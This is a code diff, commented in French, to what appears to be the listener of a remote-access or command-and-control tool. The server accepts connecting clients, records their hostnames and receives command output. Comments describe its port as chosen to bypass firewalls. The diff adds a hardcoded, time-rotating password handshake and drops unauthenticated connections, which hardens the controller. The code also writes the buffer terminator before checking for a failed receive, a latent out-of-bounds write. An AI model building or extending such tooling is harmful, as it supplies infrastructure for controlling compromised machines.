@@ -4,6 +4,7 @@
 #include <stdio.h>
 #include <vector>
 #include <string>
+#include <time.h>
 #include "client.hpp"
 #include "server.hpp"
 #include "cli.hpp"
@@ -32,6 +33,13 @@ std::string get_ip(sockaddr_in addr)
     inet_ntop(AF_INET, &addr.sin_addr, ip, INET_ADDRSTRLEN);
 
     return std::string(ip);
+}
+
+std::string get_password()
+{
+    std::string password = "dF8#kL2@xQ9!pW7zT4$eR6uM1&bY";
+    password += std::to_string(time(NULL) / 30);
+    return password;
 }
 
 int main()
@@ -67,7 +75,7 @@ int main()
     struct sockaddr_in saServer;
     saServer.sin_family = AF_INET;
     saServer.sin_addr.s_addr = INADDR_ANY;
-    saServer.sin_port = htons(4444); // port HTTPS pour bypass firewall
+    saServer.sin_port = htons(53127); // port HTTPS pour bypass firewall
 
     if (bind(sock, (struct sockaddr*)&saServer, sizeof(saServer)) == SOCKET_ERROR) //attache le socket a un port
     {
@@ -123,7 +131,7 @@ int main()
 
             Client new_client(client_socket, saClient, saClient_size);
             new_client.ip = get_ip(new_client.addr);
-            //printf("%s", new_client.ip.c_str());
+            new_client.connect_time = GetTickCount();
             server.clients.push_back(new_client);
             // printf(GREEN "Client connected! %d\n" RESET, (int)server.clients.size());
             // printf("Waiting for connection...\n");
@@ -135,14 +143,34 @@ int main()
             {
                 char buffer[1024];
                 int byte = recv(server.clients[i].socket, buffer, 1024, 0);
+                buffer[byte] = '\0';
                 std::string data = buffer;
+
+                data.erase(data.find_last_not_of("\r\n") + 1);
                 if (byte <= 0)
                 {
                     closesocket(server.clients[i].socket);
                     server.clients.erase(server.clients.begin() + i);
                     i--;
                 }
-                else if (data.find("[HOST]") == 0)
+                else if (!server.clients[i].authenticated) // check si password valide
+                {
+                    std::string p1 = get_password();
+                    std::string p2 = "dF8#kL2@xQ9!pW7zT4$eR6uM1&bY" + std::to_string((time(NULL)/30) - 1);
+
+                    if (data == "[AUTH]" + p1 || data == "[AUTH]" + p2)
+                    {
+                        server.clients[i].authenticated = true;
+                    }
+                    else
+                    {
+                        closesocket(server.clients[i].socket);
+                        server.clients.erase(server.clients.begin() + i);
+                        i--;
+                        continue;
+                    }
+                }   
+                else if (data.find("[HOST]") == 0) // choper le hostname
                 {
                     std::string hostname = data.substr(6);
                     hostname.erase(hostname.find_last_not_of("\r\n") + 1);
@@ -150,12 +178,23 @@ int main()
                     server.clients[i].hostname = hostname;
                     // printf("%s",server.clients[i].hostname.c_str());
                 }
-                else
+                else // choper se qui est envoyer
                 {
                     buffer[byte] = '\0';
                     // printf(YELLOW "\n\nClient %d: %s\n" RESET, i, buffer); // afficher output envoier par la commande
                 }
-            }         
+            }
+            // verifier si il est la sans etre auth depuis longtemp
+            else if (!server.clients[i].authenticated)
+            {
+                if (GetTickCount() - server.clients[i].connect_time > 5000)
+                {
+                    closesocket(server.clients[i].socket);
+                    server.clients.erase(server.clients.begin() + i);
+                    i--;
+                    continue;
+                }
+            }   
         }
     }
     WSACleanup();
